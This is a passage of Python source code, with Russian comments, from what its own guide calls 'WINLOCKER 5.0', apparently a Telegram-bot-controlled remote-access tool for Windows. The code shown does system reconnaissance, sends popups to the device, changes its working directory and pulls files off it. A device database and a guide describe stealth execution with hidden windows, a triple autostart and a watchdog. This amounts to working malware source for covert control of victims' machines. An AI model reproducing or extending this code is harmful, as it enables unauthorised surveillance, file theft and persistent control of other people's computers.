                        processes.append({
                            'pid': proc.info['pid'],
                            'name': proc.info['name'],
                            'memory_mb': mem_info.rss // (1024**2),
                            'cpu': proc.info['cpu_percent']
                        })
                except:
                    pass
            
            # Сортируем по использованию памяти
            processes.sort(key=lambda x: x['memory_mb'], reverse=True)
            
            scan_results.append("  Топ-5 процессов по использованию памяти:")
            for i, proc in enumerate(processes[:5], 1):
                scan_results.append(f"    {i}. {proc['name'][:25]:25} PID: {proc['pid']:6} Память: {proc['memory_mb']:5} MB CPU: {proc['cpu']:5.1f}%")
        except:
            pass
        
        # 4. Сетевые интерфейсы детально
        try:
            scan_results.append("\n🌐 <b>Детальная сетевая информация:</b>")
            
            net_io = psutil.net_io_counters()
            scan_results.append(f"  • Отправлено: {net_io.bytes_sent // (1024**2)} MB")
            scan_results.append(f"  • Получено: {net_io.bytes_recv // (1024**2)} MB")
            
            # Активные соединения
            connections = psutil.net_connections(kind='inet')
            if connections:
                scan_results.append(f"  • Всего соединений: {len(connections)}")
                
                # Группируем по статусу
                status_count = {}
                for conn in connections:
                    status = conn.status
                    status_count[status] = status_count.get(status, 0) + 1
                
                for status, count in status_count.items():
                    scan_results.append(f"    - {status}: {count}")
        except:
            pass
        
        # 5. Информация о батарее (для ноутбуков)
        try:
            battery = psutil.sensors_battery()
            if battery:
                scan_results.append("\n🔋 <b>Информация о батарее:</b>")
                scan_results.append(f"  • Заряд: {battery.percent}%")
                scan_results.append(f"  • Подключено к сети: {'Да' if battery.power_plugged else 'Нет'}")
                if battery.secsleft != psutil.POWER_TIME_UNLIMITED:
                    scan_results.append(f"  • Осталось времени: {battery.secsleft // 3600}ч {(battery.secsleft % 3600) // 60}мин")
        except:
            pass
        
        # 6. Информация о загрузке системы
        try:
            scan_results.append("\n📈 <b>Загрузка системы:</b>")
            
            # Загрузка CPU за 1, 5, 15 минут
            load_avg = psutil.getloadavg() if hasattr(psutil, 'getloadavg') else (0, 0, 0)
            scan_results.append(f"  • Загрузка CPU (1/5/15 мин): {load_avg[0]:.2f}/{load_avg[1]:.2f}/{load_avg[2]:.2f}")
            
            # Количество потоков
            thread_count = sum(p.num_threads() for p in psutil.process_iter())
            scan_results.append(f"  • Всего потоков: {thread_count}")
        except:
            pass
        
        scan_results.append("\n" + "=" * 60)
        scan_results.append("✅ <b>Глубокое сканирование завершено</b>")
        
        return "\n".join(scan_results), None
        
    except Exception as e:
        logger.error(f"Ошибка глубокого сканирования: {e}")
        return None, f"Ошибка сканирования: {e}"


def show_message_box(text, title="Сообщение от администратора"):
    """Отображение всплывающего окна с сообщением на устройстве"""
    try:
        import ctypes
        import threading
        
        def show_message():
            try:
                # Используем MessageBoxW для поддержки Unicode
                ctypes.windll.user32.MessageBoxW(0, text, title, 0x40 | 0x0)  # 0x40 = MB_ICONINFORMATION, 0x0 = MB_OK
                return True
            except Exception as e:
                logger.error(f"Ошибка при отображении сообщения: {e}")
                return False
        
        # Запускаем в отдельном потоке, чтобы не блокировать основной поток
        thread = threading.Thread(target=show_message)
        thread.daemon = True
        thread.start()
        
        # Ждем завершения потока (максимум 5 секунд)
        thread.join(timeout=5)
        
        return True
    except Exception as e:
        logger.error(f"Ошибка в show_message_box: {e}")
        return False


def change_directory(path):
    """Изменение текущей рабочей директории"""
    try:
        import os
        
        # Валидируем путь
        is_valid, validated_path = validate_path(path, must_exist=True, must_be_dir=True)
        if not is_valid:
            return False, validated_path  # validated_path содержит сообщение об ошибке
        
        # Меняем текущую директорию
        os.chdir(validated_path)
        new_path = os.getcwd()
        
        return True, f"Текущая директория изменена на: {new_path}"
    except Exception as e:
        logger.error(f"Ошибка при изменении директории: {e}")
        return False, f"Ошибка: {e}"


def validate_path(path, must_exist=True, must_be_file=None, must_be_dir=None):
    """Валидация пути с защитой от directory traversal атак
    
    Args:
        path: Путь для проверки
        must_exist: Должен ли путь существовать (по умолчанию True)
        must_be_file: Должен ли путь быть файлом (None - не проверять)
        must_be_dir: Должен ли путь быть директорией (None - не проверять)
    
    Returns:
        tuple: (is_valid, error_message) или (is_valid, normalized_path)
    """
    try:
        import os
        
        # Нормализуем путь (убираем .., . и т.д.)
        normalized_path = os.path.normpath(path)
        
        # Защита от directory traversal атак
        # Проверяем, что нормализованный путь не содержит опасных конструкций
        if '..' in path or path.startswith('~'):
            # Разрешаем относительные пути, но проверяем, что они не выходят за пределы
            abs_path = os.path.abspath(normalized_path)
            # Можно добавить дополнительные проверки, например, запрет доступа к системным директориям
            # Но для простоты просто проверяем, что путь нормализован
            
            # Логируем попытку использования потенциально опасного пути
            logger.warning(f"Попытка использования пути с directory traversal: {path} -> {normalized_path}")
        
        # Проверяем существование пути, если требуется
        if must_exist and not os.path.exists(normalized_path):
            return False, f"Путь не существует: {normalized_path}"
        
        # Проверяем, является ли путь файлом, если требуется
        if must_be_file is True and not os.path.isfile(normalized_path):
            return False, f"Путь не является файлом: {normalized_path}"
        
        # Проверяем, является ли путь директорией, если требуется
        if must_be_dir is True and not os.path.isdir(normalized_path):
            return False, f"Путь не является директорией: {normalized_path}"
        
        # Проверяем, что путь не является файлом, если требуется директория
        if must_be_dir is True and os.path.isfile(normalized_path):
            return False, f"Путь является файлом, а не директорией: {normalized_path}"
        
        # Проверяем, что путь не является директорией, если требуется файл
        if must_be_file is True and os.path.isdir(normalized_path):
            return False, f"Путь является директорией, а не файлом: {normalized_path}"
        
        return True, normalized_path
        
    except Exception as e:
        logger.error(f"Ошибка при валидации пути {path}: {e}")
        return False, f"Ошибка валидации пути: {e}"


def download_file(filepath):
    """Загрузка файла с устройства (возвращает путь к файлу или ошибку)"""
    try:
        import os
        
        # Валидируем путь
        is_valid, validated_path = validate_path(filepath, must_exist=True, must_be_file=True)
        if not is_valid:
            return None, validated_path  # validated_path содержит сообщение об ошибке
        
        # Проверяем размер файла (ограничение 50 МБ)
        file_size = os.path.getsize(validated_path)
        MAX_SIZE = 50 * 1024 * 1024  # 50 МБ
        
        if file_size > MAX_SIZE:
            return None, f"Файл слишком большой ({file_size // (1024*1024)} МБ). Максимальный размер: 50 МБ"
        
        # Возвращаем путь к файлу
        return validated_path, None
    except Exception as e:
        logger.error(f"Ошибка при подготовке файла к загрузке: {e}")
        return None, f"Ошибка: {e}"


def generate_project_guide():
    """
    Генерация полного справочника проекта с анализом:
    - .py файлов проекта
    - структуры базы данных
    - работы DLL
    - списка команд
    """
    import os
    import sys
    import inspect
    from datetime import datetime
    
    guide_lines = []
    
    # Заголовок
    guide_lines.append("=" * 80)
    guide_lines.append("ПОЛНЫЙ СПРАВОЧНИК ПРОЕКТА WINLOCKER 5.0")
    guide_lines.append(f"Сгенерировано: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    guide_lines.append("=" * 80)
    guide_lines.append("")
    
    # 1. Анализ .py файлов проекта
    guide_lines.append("1. АНАЛИЗ PYTHON ФАЙЛОВ ПРОЕКТА")
    guide_lines.append("-" * 40)
    
    py_files = []
    for root, dirs, files in os.walk("."):
        for file in files:
            if file.endswith('.py'):
                rel_path = os.path.join(root, file)
                # Пропускаем скрытые директории
                if '.git' in rel_path or '.vscode' in rel_path or '__pycache__' in rel_path:
                    continue
                py_files.append(rel_path)
    
    py_files.sort()
    guide_lines.append(f"Всего Python файлов: {len(py_files)}")
    guide_lines.append("")
    
    # Группируем по категориям
    core_files = [f for f in py_files if any(x in f for x in ['bot_core', 'bot_commands', 'bot_callbacks', 'bot_services'])]
    db_files = [f for f in py_files if 'database' in f]
    system_files = [f for f in py_files if any(x in f for x in ['system_', 'watchdog', 'unified_logger'])]
    util_files = [f for f in py_files if f not in core_files + db_files + system_files]
    
    guide_lines.append("Основные модули (ядро):")
    for f in sorted(core_files):
        guide_lines.append(f"  • {f}")
    
    guide_lines.append("")
    guide_lines.append("База данных:")
    for f in sorted(db_files):
        guide_lines.append(f"  • {f}")
    
    guide_lines.append("")
    guide_lines.append("Системные модули:")
    for f in sorted(system_files):
        guide_lines.append(f"  • {f}")
    
    guide_lines.append("")
    guide_lines.append("Вспомогательные модули:")
    for f in sorted(util_files):
        guide_lines.append(f"  • {f}")
    
    guide_lines.append("")
    
    # 2. Анализ структуры базы данных
    guide_lines.append("2. СТРУКТУРА БАЗЫ ДАННЫХ")
    guide_lines.append("-" * 40)
    
    try:
        from database import Database
        db = Database()
        
        # Получаем информацию о таблицах
        tables_info = [
            ("admins", "Администраторы системы", "telegram_id, username, role, created_at"),
            ("devices", "Устройства", "hwid, device_name, ip_address, last_online, watchdog_status"),
            ("sessions", "Сессии администраторов", "admin_id, device_id, started_at, ended_at"),
            ("action_logs", "Логи действий", "admin_id, device_id, action_type, details, timestamp")
        ]
        
        guide_lines.append("Таблицы базы данных:")
        for table_name, description, columns in tables_info:
            guide_lines.append(f"  • {table_name}: {description}")
            guide_lines.append(f"    Колонки: {columns}")
        
        guide_lines.append("")
        guide_lines.append("Статистика:")
        try:
            for table_name, _, _ in tables_info:
                count = db.get_count(table_name)
                guide_lines.append(f"  • {table_name}: {count} записей")
        except:
            guide_lines.append("  • Статистика недоступна")
            
    except Exception as e:
        guide_lines.append(f"Ошибка при анализе базы данных: {e}")
    
    guide_lines.append("")
    
    # 3. Анализ работы DLL
    guide_lines.append("3. АНАЛИЗ РАБОТЫ DLL")
    guide_lines.append("-" * 40)
    
    dll_files = []
    for root, dirs, files in os.walk("."):
        for file in files:
            if file.endswith('.dll') or file.endswith('.cpp'):
                rel_path = os.path.join(root, file)
                if '.git' in rel_path or '.vscode' in rel_path:
                    continue
                dll_files.append(rel_path)
    
    if dll_files:
        guide_lines.append("DLL и C++ файлы:")
        for f in sorted(dll_files):
            guide_lines.append(f"  • {f}")
        
        # Проверяем system_dll.py
        try:
            import system_dll
            dll_functions = []
            for name, obj in inspect.getmembers(system_dll):
                if inspect.isfunction(obj) and not name.startswith('_'):
                    dll_functions.append(name)
            
            if dll_functions:
                guide_lines.append("")
                guide_lines.append("Функции system_dll.py:")
                for func in sorted(dll_functions):
                    guide_lines.append(f"  • {func}()")
        except Exception as e:
            guide_lines.append(f"  • system_dll.py не доступен: {e}")
    else:
        guide_lines.append("DLL файлы не найдены")
    
    guide_lines.append("")
    
    # 4. Анализ списка команд
    guide_lines.append("4. СПИСОК КОМАНД БОТА")
    guide_lines.append("-" * 40)
    
    try:
        # Импортируем readme для получения списка команд
        import readme
        guide_text = readme.get_guide_text()
        
        # Извлекаем раздел с командами из guide_text
        lines = guide_text.split('\n')
        in_commands_section = False
        command_lines = []
        
        for line in lines:
            if "ОСНОВНЫЕ КОМАНДЫ" in line or "КОМАНДЫ (/coms)" in line:
                in_commands_section = True
            elif in_commands_section and line.strip() and not line.startswith(' ') and ':' in line:
                # Это заголовок раздела команд
                pass
            elif in_commands_section:
                if line.strip() and line.startswith('•'):
                    command_lines.append(line.strip())
                elif line.strip() and not line.startswith('•'):
                    # Конец раздела команд
                    break
        
        if command_lines:
            guide_lines.append("Основные команды из документации:")
            for cmd_line in command_lines[:20]:  # Ограничим вывод
                guide_lines.append(f"  {cmd_line}")
            if len(command_lines) > 20:
                guide_lines.append(f"  ... и еще {len(command_lines) - 20} команд")
        else:
            guide_lines.append("Не удалось извлечь список команд из документации")
            
    except Exception as e:
        guide_lines.append(f"Ошибка при анализе команд: {e}")
    
    guide_lines.append("")
    
    # 5. Общая информация
    guide_lines.append("5. ОБЩАЯ ИНФОРМАЦИЯ О ПРОЕКТЕ")
    guide_lines.append("-" * 40)
    
    guide_lines.append(f"Всего файлов проекта: {len(py_files) + len(dll_files)}")
    guide_lines.append(f"Python файлов: {len(py_files)}")
    guide_lines.append(f"DLL/C++ файлов: {len(dll_files)}")
    guide_lines.append("")
    guide_lines.append("Архитектурные принципы:")
    guide_lines.append("  • Модульность: разделение на bot_core, bot_commands, bot_services")
    guide_lines.append("  • Безопасность: ролевая модель, защита от directory traversal")
    guide_lines.append("  • Надежность: тройная система автозапуска, watchdog")
    guide_lines.append("  • Стелс-режим: CREATE_NO_WINDOW для всех системных команд")
    
    guide_lines.append("")
    guide_lines.append("=" * 80)
    guide_lines.append("Конец справочника")
    guide_lines.append("=" * 80)
    
    return guide_lines